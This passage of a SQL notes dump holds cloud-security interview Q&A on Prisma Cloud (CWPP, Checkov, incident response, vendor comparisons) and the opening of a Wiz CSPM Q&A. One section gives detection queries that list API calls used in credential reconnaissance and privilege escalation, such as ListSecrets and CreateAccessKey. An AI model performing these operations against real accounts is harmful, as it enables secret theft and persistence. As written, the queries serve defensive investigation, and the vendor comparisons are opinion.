├── Business Unit A (Finance)
│   ├── BU-A-Production (10 accounts)
│   ├── BU-A-Staging (3 accounts)
│   └── BU-A-Development (5 accounts)
├── Business Unit B (Retail)
│   ├── BU-B-Production (8 accounts)
│   ├── BU-B-Staging (3 accounts)
│   └── BU-B-Development (6 accounts)
├── Business Unit C (Operations)
│   ├── BU-C-Production (5 accounts)
│   ├── BU-C-Staging (3 accounts)
│   └── BU-C-Development (7 accounts)
└── Shared Services
    └── Shared-Infra (3 accounts - logging, networking, security)
```

**RBAC Design:**
- **Security Team:** System Admin across all Account Groups
- **BU-A Security Lead:** Account Group Admin for BU-A groups
- **BU-A Developers:** Account Group Read Only for BU-A groups
- **Compliance Team:** Account Group Read Only for all Production Account Groups

**Phase 2: Onboarding (Week 2-3)**
1. Create a Terraform module for the Prisma Cloud IAM role deployment
2. Deploy via AWS CloudFormation StackSets to all 50 accounts simultaneously
3. Onboard accounts in Prisma Cloud and assign to Account Groups
4. Validate connectivity and initial scan completion

**Phase 3: Policy Configuration (Week 3-4)**

**Alert Rules by Environment:**

| Environment | Severity Threshold | Channels |
|---|---|---|
| Production | Critical + High | PagerDuty + Jira + Slack |
| Staging | Critical | Jira + Slack |
| Development | Critical only (informational) | Slack only |

**Compliance Enablement:**
- PCI DSS → Finance BU Production accounts
- SOC 2 → All Production accounts
- CIS AWS → All accounts
- Custom internal standard → All accounts

**Phase 4: Integration (Week 4-5)**
- Jira: Project per BU, auto-ticket creation from alerts
- Slack: Channel per BU (#security-bu-a, #security-bu-b)
- SIEM: Forward all alerts to Cortex XSIAM/Splunk
- CI/CD: Integrate Checkov into all CI/CD pipelines

**Phase 5: Operationalization (Week 5-8)**
- Train security team and BU security leads
- Establish SLA framework for remediation
- Create governance dashboards
- Schedule monthly compliance review meetings per BU
- Document runbooks for common investigation flows

---

# SECTION 5: PRISMA CLOUD CWPP (COMPUTE) & CODE SECURITY

---

### Q21. Explain Prisma Cloud CWPP (formerly Twistlock). How does it differ from CSPM?

**Answer:**

| Aspect | CSPM | CWPP (Compute) |
|---|---|---|
| **What it monitors** | Cloud infrastructure configuration (how resources are set up) | Runtime workload behavior (what's running inside VMs, containers, serverless) |
| **Architecture** | Agentless — API-based cloud scanning | Agent-based — Prisma Cloud Defender deployed on each host/container |
| **Detection Focus** | Misconfigurations, compliance violations, identity risks | Vulnerabilities, malware, container drift, runtime attacks, network anomalies |
| **Example Finding (CSPM)** | "Security group allows SSH from 0.0.0.0/0" | N/A |
| **Example Finding (CWPP)** | N/A | "Cryptominer binary executed in container after deploy" |
| **When it helps** | Preventing misconfigurations before they're exploited | Detecting and preventing attacks during runtime |

**CWPP Key Capabilities:**

**1. Vulnerability Management:**
- Scans running workloads for OS and application vulnerabilities
- Image scanning in registries (ECR, ACR, GCR, Artifactory)
- CI/CD pipeline scanning (fail builds with Critical CVEs)

**2. Runtime Protection:**
- Process monitoring — detect and block unexpected process execution
- File system monitoring — detect container drift (new binaries added post-deploy)
- Network monitoring — detect anomalous connections and port scanning

**3. Container Security:**
- Container compliance — enforce CIS Docker/Kubernetes benchmarks
- Admission control — block non-compliant images from being deployed
- Forensics — full process tree and command history for incident investigation

**4. Web Application & API Security (WAAS):**
- Built-in WAF for protecting web applications
- API security — detect and block API abuse
- Bot protection — block automated attacks

**5. Serverless Security:**
- Scan Lambda, Azure Functions, GCP Cloud Functions for vulnerabilities
- Runtime protection via wrapper instrumentation

---

### Q22. How does the Prisma Cloud Defender (agent) work? Discuss deployment models.

**Answer:**

**What is the Defender?**
The Prisma Cloud Defender is a lightweight agent deployed on hosts, containers, and serverless functions to provide runtime security monitoring and protection.

**Deployment Models:**

| Model | Where Deployed | Use Case |
|---|---|---|
| **Container Defender** | DaemonSet on each Kubernetes node | EKS, AKS, GKE clusters |
| **Host Defender** | On each VM/EC2 instance | Non-containerized workloads |
| **Serverless Defender** | Lambda layer / function wrapper | Serverless functions |
| **App-Embedded Defender** | Embedded in container image | Fargate, Cloud Run (no host access) |
| **Agentless Scanning** | No deployment needed | Quick assessment without agent installation |

**Container Defender Architecture (EKS):**
```
EKS Cluster
├── Namespace: twistlock
│   ├── DaemonSet: twistlock-defender-ds
│   │   ├── Pod on Node 1: defender
│   │   ├── Pod on Node 2: defender  
│   │   └── Pod on Node N: defender
│   └── Console Connection: → Prisma Cloud SaaS Console
```

**How the Defender works:**
1. Runs as a privileged container (DaemonSet) on each node
2. Monitors all containers on the node via the container runtime socket
3. Captures: process execution, file system changes, network connections
4. Compares observed behavior against learned models and configured rules
5. Actions: Alert, Block, or Quarantine based on policy configuration

**Sizing Guidelines:**
- Memory: ~256MB per Defender
- CPU: ~0.5 vCPU
- Network: Only outbound to Prisma Cloud SaaS console (port 443)

---

### Q23. Describe Prisma Cloud's Code Security capability (formerly Bridgecrew/Checkov).

**Answer:**

**Checkov — The Engine:**
Checkov is the open-source IaC scanning engine that powers Prisma Cloud Code Security. It's the most widely adopted open-source IaC scanner.

**Key Capabilities:**

**1. IaC Scanning:**
- Scans Terraform, CloudFormation, Kubernetes YAML, Helm, Dockerfile, ARM, Bicep
- 1000+ built-in policies covering AWS, Azure, GCP
- Custom policies in Python or YAML

**2. SCA (Software Composition Analysis):**
- Scans open-source dependencies (package.json, requirements.txt, pom.xml)
- Identifies known CVEs in third-party libraries
- License compliance checking

**3. Secrets Detection:**
- Identifies hard-coded secrets in source code and IaC files
- Detects: API keys, passwords, tokens, certificates, private keys
- Reduces risk of credential exposure in version control

**4. Supply Chain Security:**
- Visualizes the dependency graph of IaC modules
- Identifies which third-party Terraform modules are used and their trust level
- Detects if any module versions have known vulnerabilities

**5. Drift Detection:**
- Compares IaC definitions against actual cloud configuration
- Identifies resources that were modified outside of IaC (manual console changes)
- Helps enforce IaC-as-single-source-of-truth

**Integration Points:**
```
Developer Workstation (IDE Plugin)
    ↓
Git (Pre-commit Hook via Checkov)
    ↓
CI/CD Pipeline (GitHub Actions / GitLab CI / Jenkins)
    ↓
Prisma Cloud Console (centralized visibility)
    ↓
Cloud Runtime (drift monitoring)
```

---

# SECTION 6: PRISMA CLOUD vs. COMPETITORS

---

### Q24. Compare Prisma Cloud CSPM with AWS Security Hub.

**Answer:**

| Capability | AWS Security Hub | Prisma Cloud CSPM |
|---|---|---|
| **Scope** | AWS only (single cloud) | Multi-cloud: AWS, Azure, GCP, OCI, Alibaba, IBM |
| **Data Sources** | Aggregates findings from GuardDuty, Inspector, Macie, Config, Firewall Manager | Direct API-based scanning of all cloud resources + IaC + runtime |
| **Custom Rules** | Limited to AWS Config managed/custom rules | Full RQL query language for custom policies — highly flexible |
| **Compliance** | Maps to CIS, NIST, PCI — basic reporting | 100+ frameworks, one-click reporting, custom standards |
| **Identity Analysis** | IAM Access Analyzer — some cross-account analysis | Full CIEM — effective permissions, unused privileges, cross-account trust mapping |
| **Attack Path** | No attack path analysis | Attack path analysis connecting misconfigs, vulns, identities, and data |
| **IaC Scanning** | No native IaC scanning | Full Checkov-powered IaC scanning integrated into CI/CD |
| **Cost** | Free to enable (charges for consolidated findings) | Subscription-based licensing (by resource count) |
| **Integration** | Native AWS services, basic SIEM forwarding | Extensive integration: Jira, ServiceNow, Slack, SIEM, SOAR, CI/CD |

**When to use each:**
- **Security Hub:** Best within AWS-only shops that want a free, native aggregation point for AWS findings
- **Prisma Cloud:** Essential for multi-cloud environments, organizations needing deep investigation (RQL), comprehensive compliance reporting, and full CNAPP capabilities

---

### Q25. Compare Prisma Cloud with Wiz. When would you choose one over the other?

**Answer:**

| Aspect | Prisma Cloud | Wiz |
|---|---|---|
| **Architecture** | Hybrid: Agentless CSPM + Agent-based CWPP (Defender) | Agentless-first (optional Wiz Defend sensors) |
| **CSPM** | Strong — RQL-powered, 100+ compliance frameworks | Very strong — Security Graph with contextual attack path analysis |
| **CWPP** | Excellent — Mature runtime protection (ex-Twistlock), container drift prevention, WAAS | Good — Agentless vuln scanning; runtime CDR via Wiz Defend (newer) |
| **CIEM** | Strong — Net effective permissions, unused access detection | Strong — Transitive access mapping, blast radius computation |
| **IaC Scanning** | Excellent — Checkov (open-source leader), supply chain security | Good — IaC scanning integrated but Checkov is more feature-rich |
| **Risk Prioritization** | Policy-level severity, improving with attack path analysis | Industry-leading — Security Graph + toxic combinations |
| **Investigation** | RQL — powerful for advanced users, steep learning curve | Graph visualization — intuitive, fast time-to-insight |
| **Ecosystem** | Palo Alto Networks (Cortex XSIAM, XSOAR, Strata) — enterprise SOC integration | Google Cloud (after 2026 acquisition) — Google SecOps, Mandiant |
| **Time to Value** | Longer — agent deployment, RQL learning curve, policy tuning | Faster — agentless, intuitive UX, immediate attack path visibility |
| **Maturity** | Very mature — evolved over 5+ years through acquisitions | Newer but rapidly maturing — founded 2020 |
| **Pricing** | Credit-based model — can be complex | Simpler per-resource pricing |

**When to choose Prisma Cloud:**
- Organizations already invested in Palo Alto Networks ecosystem (Cortex, Strata)
- Need strong runtime CWPP (agent-based container protection, WAAS)
- Want deep investigation capability with RQL
- Large engineering teams comfortable with complex tooling

**When to choose Wiz:**
- Need rapid time-to-value and immediate risk visibility
- Want intuitive, graph-based risk prioritization
- Organization prefers agentless-first approach
- Need to quickly demonstrate ROI to leadership with attack path reduction metrics

---

# SECTION 7: ADVANCED & GRILLING QUESTIONS

---

### Q26. How does Prisma Cloud detect and respond to threats at runtime vs. at the configuration layer?

**Answer:**

**Configuration Layer (CSPM — Proactive):**
- **Detection:** Continuous API-based scanning identifies misconfigurations before they're exploited
- **Response:** Alert → Ticket → Remediation (manual or automated)
- **Example:** "Security group allows 0.0.0.0/0 to port 3306" → Alert fires → DBA updates the SG → Alert auto-resolves on next scan

**Runtime Layer (CWPP/Compute — Reactive):**
- **Detection:** Defender agent monitors live workload behavior at the process, file, and network level
- **Response:** Alert + Block + Quarantine (automated prevention)
- **Example:** "Container drift detected — unknown binary 'xmrig' written to /tmp and executed" → Defender blocks the process → SOC investigates

**The Combined Power (CNAPP):**
When both layers are active, you get full lifecycle security:
1. **CSPM** warns: "This EC2 instance has a Critical CVE, is internet-facing, and has an overly-permissive IAM role" (configuration risk)
2. **CWPP** detects: "This EC2 instance is actively being exploited — reverse shell spawned" (runtime attack)
3. **Combined response:** Immediately correlate the CSPM risk with the CWPP detection, validate the attack path, and contain (isolate instance + revoke IAM role)

---

### Q27. Explain how Prisma Cloud handles network security and microsegmentation.

**Answer:**

**Network Flow Visualization:**
Prisma Cloud ingests VPC Flow Logs (AWS), NSG Flow Logs (Azure), and VPC Flow Logs (GCP) to build a visual network topology:
- Shows actual traffic flows between resources
- Identifies: Internet-facing resources, internal communication patterns, unexpected cross-VPC traffic

**Network RQL Queries:**
```
network from vpc.flow_record where 
dest.resource IN (resource where role IN ('AWS RDS', 'AWS Redshift')) AND 
source.publicnetwork IN ('Internet IPs')
AND bytes > 0
```
This identifies actual internet traffic reaching databases — not just security group rules that allow it, but confirmed traffic flows.

**Network Exposure Analysis:**
Combines:
- Security group rules (what's allowed?)
- Network ACL rules (what's filtered?)
- VPC routing (how is traffic routed?)
- Actual flow logs (what traffic is actually flowing?)

**Microsegmentation (Cloud Network Security Module):**
- Visualizes workload communication patterns
- Recommends network policies based on observed traffic
- Identifies workloads that communicate but shouldn't
- Helps implement zero-trust network architecture

**Why this matters:**
"A security group rule allowing 0.0.0.0/0 is a CSPM finding. But if VPC Flow Logs show that no actual internet traffic is reaching the resource (maybe it's behind an ALB with tighter rules), the real risk is lower. Network flow analysis gives us the ground truth."

---

### Q28. What are Prisma Cloud Anomaly Policies and how do you tune them?

**Answer:**

**Anomaly Policies:**
Prisma Cloud uses ML-based behavioral analytics to detect unusual patterns:

**Types:**
- **UEBA (User and Entity Behavior Analytics):** Unusual API calls, unusual geographic access, unusual time-of-day activity
- **Network Anomalies:** Unusual port usage, unusual data transfer volumes, unusual destination IPs
- **DNS Anomalies:** Communication with known malicious domains

**How anomaly detection works:**
1. **Baseline Period:** 2-4 weeks of learning normal behavior per identity and resource
2. **Model Training:** ML models establish what "normal" looks like for each entity
3. **Detection:** Deviations from the baseline trigger anomaly alerts
4. **Severity:** Based on the degree of deviation and the risk context

**Tuning Process:**
1. **Initial Deployment:** Enable all anomaly policies in "low" sensitivity
2. **Baseline Period (2-4 weeks):** Allow models to train — expect some noise
3. **Review False Positives:** Common FPs:
   - CI/CD service accounts using different source IPs (legitimate)
   - New team members accessing resources for the first time (legitimate)
   - Seasonal business patterns (e.g., end-of-quarter reporting)
4. **Whitelist Known Patterns:**
   - Exclude CI/CD service account ARNs from UEBA policies
   - Add known automation IPs to trusted IP lists
5. **Adjust Sensitivity:**
   - Critical environments: High sensitivity → more alerts but catches subtle attacks
   - Dev environments: Low sensitivity → fewer false positives
6. **Monthly Review:** Are anomaly alerts leading to investigations? If not, further tune.

---

### Q29. How would you use Prisma Cloud to investigate a suspected compromised IAM access key?

**Answer:**

**Step 1: Identify the Key**
```
config from cloud.resource where api.name = 'aws-iam-get-credential-report' AND 
json.rule = user_name = 'suspicious-user'
```
Pull the credential report for the user.

**Step 2: Event Investigation**
```
event from cloud.audit_logs where 
user = 'arn:aws:iam::123456789012:user/suspicious-user' AND 
cloud.account = 'prod-main'
```
Review all API calls made by this user in the incident window.

**Step 3: Look for Reconnaissance**
```
event from cloud.audit_logs where 
user = 'arn:aws:iam::123456789012:user/suspicious-user' AND 
operation IN ('ListBuckets', 'DescribeInstances', 'ListRoles', 'ListUsers', 
'GetCallerIdentity', 'ListSecrets')
```
These reconnaissance API calls are strong indicators of compromised credentials.

**Step 4: Check for Privilege Escalation**
```
event from cloud.audit_logs where 
user = 'arn:aws:iam::123456789012:user/suspicious-user' AND 
operation IN ('CreateUser', 'CreateAccessKey', 'PutRolePolicy', 
'AttachUserPolicy', 'CreatePolicyVersion', 'CreateRole')
```
These operations suggest the attacker is establishing persistence or escalating privileges.

**Step 5: Check Source IPs**
Review the source IPs in the event logs:
- Are they from known corporate egress IPs?
- Are they from an unexpected country?
- Are they from known VPN/Tor exit nodes?

**Step 6: Containment**
If compromise is confirmed:
1. Disable the access key immediately
2. Apply an inline IAM deny policy to the user (blocks all sessions)
3. Review all resources accessed/modified during the compromise
4. Rotate any secrets or credentials the user could have accessed
5. Create Prisma Cloud alert for similar patterns to catch future attempts

---

### Q30. What is the Prisma Cloud Copilot and how does it help security operations?

**Answer:**
Prisma Cloud Copilot is the AI-powered assistant built on Palo Alto Networks' **Precision AI®** that enables security teams to interact with Prisma Cloud using natural language.

**Capabilities:**

**1. Natural Language Querying:**
Instead of writing RQL:
```
Human: "Show me all S3 buckets that are publicly accessible and contain sensitive data"
Copilot: Translates to RQL → Runs query → Returns results with context
```

**2. Investigation Assistance:**
```
Human: "Why is this alert Critical?"
Copilot: "This S3 bucket is publicly accessible (policy XYZ), contains PII data classified by DSPM, 
and is accessible via an IAM role attached to an internet-facing EC2 instance with a Critical CVE. 
These three factors create an exploitable attack path."
```

**3. Remediation Guidance:**
```
Human: "How do I fix this finding?"
Copilot: "To remediate, update the S3 bucket policy to deny public access. 
Here's the specific AWS CLI command... and here's the Terraform change..."
```

**4. Report Generation:**
```
Human: "Generate a compliance summary for our PCI scope for the last quarter"
Copilot: Generates a formatted report with trend data, top failures, and remediation progress
```

**Why it matters:**
"The Copilot lowers the barrier to entry for cloud security. A Level 1 analyst who doesn't know RQL can still investigate alerts effectively. A compliance officer who needs a report doesn't need to navigate 10 dashboard pages. It democratizes access to Prisma Cloud's powerful data."

---

# SECTION 8: OPERATIONAL BEST PRACTICES

---

### Q31. What operational metrics should you track for Prisma Cloud CSPM?

**Answer:**

| Metric | What It Measures | Target |
|---|---|---|
| **Mean Time to Remediate (MTTR) by Severity** | Average time from alert creation to resolution | Critical: < 24h, High: < 48h, Medium: < 7d |
| **Open Alert Count by Severity** | Current backlog of unresolved alerts | Trending down month-over-month |
| **Alert-to-Resolution Rate** | % of alerts resolved vs. dismissed/snoozed | > 70% resolved (not just dismissed) |
| **Compliance Score by Framework** | % of controls passing per framework | > 90% for production environments |
| **Policy Coverage** | % of cloud resource types covered by at least one policy | > 95% |
| **Account Onboarding Coverage** | % of cloud accounts onboarded to Prisma Cloud | 100% |
| **False Positive Rate** | % of alerts that are dismissed as false positives | < 15% (if higher, policies need tuning) |
| **Critical Attack Paths** | Number of exploitable attack paths to sensitive data | 0 (aspirational), trending down |
| **SLA Compliance** | % of alerts remediated within SLA | > 90% |
| **Scan Failure Rate** | % of accounts/resources that fail to scan | < 1% |

**Governance Dashboard:**
Present these metrics monthly to:
- **CISO:** Top 5 Critical risks, compliance trends, SLA compliance
- **Engineering Leads:** Their team's open alerts, remediation velocity, top findings
- **Audit/Compliance:** Framework-specific compliance trends, evidence generation

---

### Q32. Describe your incident response workflow using Prisma Cloud.

**Answer:**

**Phase 1: Detection (0-15 minutes)**
1. Prisma Cloud alert fires (CSPM misconfiguration, CWPP runtime event, or Anomaly)
2. Alert routes to PagerDuty (Critical) or Jira (High) based on Alert Rules
3. SOC analyst reviews the alert in Prisma Cloud console

**Phase 2: Triage (15-60 minutes)**
4. Assess the alert context:
   - CSPM: Review resource configuration, check attack path context
   - CWPP: Review process tree, file events, network connections
   - Anomaly: Review behavioral deviation, source IP, API call pattern
5. Query related events via RQL:
   ```
   event from cloud.audit_logs where 
   cloud.account = 'affected-account' AND 
   operation IN ('suspicious-ops') AND 
   timestamp > '2026-03-30T00:00:00Z'
   ```
6. Determine: Is this a real threat or a benign activity?

**Phase 3: Containment (1-4 hours)**
7. If confirmed threat:
   - Revoke compromised credentials (IAM inline deny policy)
   - Isolate affected resources (security group quarantine)
   - Block attacker network indicators (WAF/NACL)
8. If CWPP runtime event:
   - Use Defender to quarantine the container/host
   - Capture forensic data (process tree, file events, network connections)

**Phase 4: Investigation (4-24 hours)**
9. Use Prisma Cloud's timeline and graph views to understand full scope
10. Cross-reference with SIEM (Cortex XSIAM/Splunk) for correlated events
11. Document findings in incident report

**Phase 5: Remediation (24-72 hours)**
12. Fix the root cause configuration (patch, update IAM policy, fix network rules)
13. Verify fix in Prisma Cloud — alert should auto-resolve
14. Add preventive controls (SCP, policy update, IaC pipeline check)
15. Conduct post-incident review and update playbooks

---

### Q33. How do you handle Prisma Cloud platform maintenance and lifecycle management?

**Answer:**

**1. Defender Upgrades:**
- Prisma Cloud releases new Defender versions regularly
- Upgrade strategy: Dev → Staging → Production (never upgrade all at once)
- Monitor Defender health dashboard after upgrades — watch for connectivity issues
- Automate upgrades via DaemonSet rolling update strategy

**2. Policy Updates:**
- Prisma Cloud regularly adds new policies (monthly cadence)
- New policies are disabled by default — review before enabling
- Process: Review new policies → Test in non-production → Enable for production
- Track policy changelog for breaking changes

**3. API Key Rotation:**
- Rotate Prisma Cloud API keys every 90 days
- Automate via vault/secrets management
- Audit which automation uses which API keys

**4. Account Maintenance:**
- New AWS accounts created → auto-onboard via StackSets + Lambda webhook
- Decommissioned accounts → remove from Prisma Cloud to avoid stale alerts
- Validate scan connectivity monthly — check for expired cross-account roles

**5. Performance Monitoring:**
- Monitor scan latency — if scans take longer than expected, check account permissions
- Monitor alert pipeline — if alerts stop flowing for an account, investigate
- Monitor Defender resource usage — ensure DaemonSet pods aren't consuming excessive node resources

---

END OF PRISMA CLOUD INTERVIEW Q&A

---
*Prepared for Cloud Security Interview Preparation — March 2026*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Wiz_CSPM_Interview_QA$VELSEC$, $VELSEC$Wiz Cspm Interview Qa$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# Wiz Cloud Security — Interview Questions & Answers

**Comprehensive CSPM / CNAPP Interview Preparation**
Prepared: March 2026

---

# SECTION 1: WIZ PLATFORM FUNDAMENTALS

---

### Q1. What is Wiz and how does it differentiate itself in the CNAPP market?

**Answer:**
Wiz is an agentless Cloud-Native Application Protection Platform (CNAPP) that provides full-stack cloud security visibility across IaaS, PaaS, containers, serverless, and data stores — all without deploying any agents into the customer environment.

What sets Wiz apart is its **Security Graph** — a contextual risk engine that connects and correlates findings across misconfigurations (CSPM), vulnerabilities (CWPP), excessive identities (CIEM), exposed sensitive data (DSPM), and network exposure into a single interconnected graph. Instead of generating thousands of siloed alerts, Wiz identifies **"toxic combinations"** — scenarios where multiple low-to-medium severity issues chain together to create genuine, exploitable attack paths.

**Key differentiators:**
- **100% Agentless:** Uses cloud provider APIs (AWS, Azure, GCP, OCI, Alibaba) for read-only snapshot analysis — zero performance impact on workloads
- **Time-to-Value:** Can onboard an entire AWS Organization in minutes via a single CloudFormation StackSet, compared to weeks for agent-based solutions
- **Contextual Prioritization:** A Critical CVE on an internet-facing VM with admin IAM permissions and access to PII data is flagged differently than the same CVE on an internal dev box with no data access
- **Unified Platform:** Single console covering CSPM, CWPP, CIEM, DSPM, IaC scanning, Container/K8s security, and AI-SPM
- **Google Acquisition (2026):** Now integrated with Google Security Operations and Mandiant threat intelligence for enhanced detection and response

---

### Q2. Explain Wiz's agentless architecture. How does it scan workloads without agents?

**Answer:**
Wiz's agentless approach works by connecting to the cloud provider's control plane APIs and taking a multi-layered approach:

**1. Cloud API Enumeration:**
Wiz connects via cloud-native APIs (e.g., AWS APIs for EC2, IAM, S3, EKS, Lambda, etc.) using a read-only cross-account role. This provides the full asset inventory — every resource, its configuration, IAM bindings, network exposure, and relationships.

**2. Disk Snapshot Analysis (Workload Scanning):**
For vulnerability and malware scanning, Wiz takes point-in-time snapshots of the virtual disks (EBS volumes in AWS, Managed Disks in Azure) attached to running instances. These snapshots are:
- Created in the customer's account
- Mounted in an isolated Wiz-managed environment (or customer-managed connector account)
- Analyzed for: OS packages, application libraries, container images, secrets, malware, and sensitive data
- Deleted after scanning

This approach provides deep workload visibility (equivalent to what an agent sees on a filesystem) without running any code on production machines.

**3. Container Registry Scanning:**
Wiz connects directly to container registries (ECR, ACR, GCR, Harbor, JFrog) to scan every image for vulnerabilities and misconfigurations before they are deployed.

**4. Kubernetes API Analysis:**
Wiz connects to the Kubernetes API server (EKS, AKS, GKE) to enumerate all workloads, RBAC configurations, network policies, and pod security settings.

**Trade-offs vs. Agent-Based:**
- **Pros:** No deployment overhead, no kernel compatibility issues, no performance impact, instant org-wide coverage
- **Cons:** No real-time runtime detection (process execution, syscall monitoring) — Wiz addresses this with **Wiz Defend**, which uses lightweight eBPF-based sensors for runtime CDR (Cloud Detection & Response)

---

### Q3. What is the Wiz Security Graph? Why is it important?

**Answer:**
The Wiz Security Graph is the core data model that distinguishes Wiz from traditional CSPM tools. It is a massive interconnected graph that maps **relationships** between every entity in your cloud environment.

**How it works:**
- Every cloud resource (VM, container, database, S3 bucket, IAM role, security group, VPC, etc.) becomes a **node** in the graph
- Every relationship (e.g., "VM → uses → IAM Role", "IAM Role → can access → S3 Bucket", "S3 Bucket → contains → PII data", "VM → exposed to → Internet") becomes an **edge**
- The graph engine traverses these edges to compute **effective exposure paths** and **blast radius**

**Why it matters — The Toxic Combination Example:**
Consider these 4 individual findings, each appearing as LOW or MEDIUM severity in a traditional CSPM:
1. An EC2 instance has a Critical CVE (MEDIUM — it's internal)
2. The same instance has a security group allowing port 443 from 0.0.0.0/0 (MEDIUM — many web servers do this)
3. The instance's IAM role has s3:* permissions (MEDIUM — overly broad but internal)
4. An S3 bucket accessible by that role contains PII classified by DSPM (LOW — it's IAM-protected)

Independently, none of these is urgent. But the Security Graph connects them into an **attack path**: Internet → Exploit CVE on public instance → Assume IAM role → Access PII in S3. This "toxic combination" is now a **CRITICAL** finding that demands immediate attention.

**Interview Talking Point:**
"The Security Graph turns cloud security from a whack-a-mole of individual alerts into a strategic exercise of eliminating the paths that actually lead to business-impacting breaches. When I prioritize remediation, I focus on breaking the highest-value attack paths rather than fixing every individual misconfiguration."

---

### Q4. Explain the concept of "Toxic Combinations" in Wiz. Give an example.

**Answer:**
Toxic combinations are scenarios where multiple individually low-severity security issues combine to form a high-risk, exploitable attack path. This is the fundamental insight behind Wiz's risk prioritization model.

**Example Scenario — "The Intern's S3 Backdoor":**

| Finding | Individual Severity |
|---|---|
| Lambda function has a code injection vulnerability (outdated dependency) | Medium |
| Lambda execution role has `s3:*` on all buckets | Medium |
| Lambda is invoked via a public API Gateway endpoint (no WAF, no auth) | Medium |
| An S3 bucket accessible by the Lambda role has Macie-classified PII data (50k customer records) | Low (IAM-protected) |
| The same S3 bucket has versioning disabled | Low |

**Toxic Combination (Attack Path):**
Public API Gateway → Exploit code injection in Lambda → Assume Lambda's overly-permissive IAM role → Exfiltrate 50k PII records from S3 → No versioning means attacker can also delete data to cover tracks

**Wiz presents this as:** A single CRITICAL attack path with all 5 nodes visualized in the Security Graph, along with a clear remediation priority:
1. **Break the path immediately:** Restrict Lambda IAM role to specific bucket ARNs (kills the path)
2. **Harden the entry point:** Add WAF + auth to API Gateway
3. **Fix the vulnerability:** Update the Lambda dependency
4. **Defense in depth:** Enable S3 versioning and Object Lock

**Why this matters in interviews:**
"When an auditor or CISO asks 'What are our top 5 risks?', I can point to 5 specific attack paths with business context — not a spreadsheet of 3,000 misconfiguration alerts."

---

### Q5. What are the core modules/capabilities of the Wiz platform?

**Answer:**

| Module | What It Does | Key Use Case |
|---|---|---|
| **CSPM** (Cloud Security Posture Management) | Continuously evaluates cloud infrastructure configuration against security benchmarks and best practices | Detect public S3 buckets, unrestricted security groups, missing encryption, IAM misconfigurations |
| **CWPP** (Cloud Workload Protection) | Agentless vulnerability scanning of VMs, containers, and serverless functions | Find Critical CVEs in running workloads without deploying agents |
| **CIEM** (Cloud Infrastructure Entitlement Management) | Analyzes effective IAM permissions, detects overly-permissive identities, unused privileges | Identify an IAM role that can assume 47 other roles but only uses 3 |
| **DSPM** (Data Security Posture Management) | Discovers and classifies sensitive data across data stores (S3, RDS, Snowflake, etc.) | Find PII/PHI/PCI data in unencrypted S3 buckets or publicly accessible databases |
| **Container & Kubernetes Security** | Scans K8s clusters, registries, and running containers for misconfigs and vulnerabilities | Detect privileged containers, overly-broad RBAC, unscanned images |
| **IaC Scanning** | Scans Terraform, CloudFormation, Helm, etc. in CI/CD pipelines before deployment | Prevent misconfigurations from reaching production — shift-left |
| **AI-SPM** (AI Security Posture Management) | Discovers AI pipelines, models, training data and assesses AI-specific risks | Find Shadow AI, misconfigured SageMaker endpoints, exposed model artifacts |
| **Wiz Defend (CDR)** | Runtime cloud detection & response using lightweight eBPF sensors + cloud signal correlation | Detect active exploitation, container escapes, and lateral movement in real-time |

---

### Q6. How does Wiz handle compliance monitoring? Name frameworks it supports.

**Answer:**
Wiz provides continuous compliance monitoring by mapping its security policies to regulatory and industry frameworks. Unlike point-in-time audit tools, Wiz provides a **live compliance posture** that updates as cloud configurations change.

**How it works:**
1. **Policy Mapping:** Each Wiz security rule is mapped to one or more compliance framework controls (e.g., a rule checking for S3 public access maps to CIS AWS 2.1.1, PCI DSS 1.3.6, NIST AC-3, etc.)
2. **Continuous Assessment:** Every cloud configuration change is evaluated against mapped policies in near-real-time
3. **Compliance Dashboard:** A unified view showing pass/fail status per framework, per account, per business unit
4. **Export & Reporting:** One-click compliance reports suitable for external auditors, with evidence of control effectiveness
5. **Custom Frameworks:** Organizations can define custom compliance frameworks mapping internal policies to Wiz rules

**Supported Frameworks:**
- CIS Benchmarks (AWS, Azure, GCP, Kubernetes, Docker)
- NIST SP 800-53 (Rev 4 & 5)
- NIST CSF
- PCI DSS v4.0
- SOC 2 Type II
- HIPAA / HITECH
- GDPR
- ISO 27001 / 27017 / 27018
- FedRAMP
- MITRE ATT&CK Cloud Matrix
- CSA CCM (Cloud Controls Matrix)
- AWS Well-Architected Framework (Security Pillar)
- Custom organizational frameworks

**Interview Talking Point:**
"When I need to prepare for a SOC 2 audit, I pull the Wiz compliance report for the SOC 2 framework, identify the failing controls, and work with engineering teams to remediate them before the auditor arrives. The evidence is already captured — control status, when it passed/failed, and what changed."

---

# SECTION 2: WIZ CSPM DEEP DIVE

---

### Q7. How does Wiz CSPM differ from traditional CSPM tools like AWS Config or Security Hub?

**Answer:**

| Capability | AWS Config / Security Hub | Wiz CSPM |
|---|---|---|
| **Scope** | Single AWS account (or Organization with aggregation) | Multi-cloud: AWS, Azure, GCP, OCI, Alibaba — unified view |
| **Finding Context** | Isolated — "SG allows 0.0.0.0/0" without context on what's behind the SG | Contextual — "SG allows 0.0.0.0/0 on a VM with Critical CVE, admin IAM role, and PII data access" |
| **Risk Prioritization** | Severity is static based on rule definition | Severity is dynamic based on graph analysis — same misconfiguration gets different severity depending on exposure context |
| **Attack Path Visualization** | No attack path analysis | Full attack path from internet to crown jewels visualized in the Security Graph |
| **Cross-Resource Correlation** | Limited — each Config rule evaluates one resource type | Full cross-resource correlation: VM → IAM → S3 → Data Classification in a single query |
| **Compliance** | Maps rules to frameworks but generating reports requires custom work | One-click compliance reports with evidence for 30+ frameworks |
| **Remediation Guidance** | Basic — "remediate this SG" | Rich — "this SG is the entry point to an attack path; here are the 3 ways to break the path, prioritized by impact and effort" |
| **Identity Context** | IAM Access Analyzer provides some policy analysis | Full effective permissions computation including transitive role assumptions and unused privilege identification |

**When you'd still use AWS-native tools:**
- AWS Config is excellent for **preventive guardrails** (e.g., auto-remediation via Config Rules + SSM Automation)
- Security Hub is great as a **central aggregation point** within AWS for native findings (GuardDuty, Inspector, Macie)
- Wiz complements these by providing the **cross-cloud, cross-resource, contextual risk layer** on top

---

### Q8. Walk me through how Wiz onboards a new AWS environment.

**Answer:**

**Step 1: Connector Setup (5-10 minutes per Organization)**
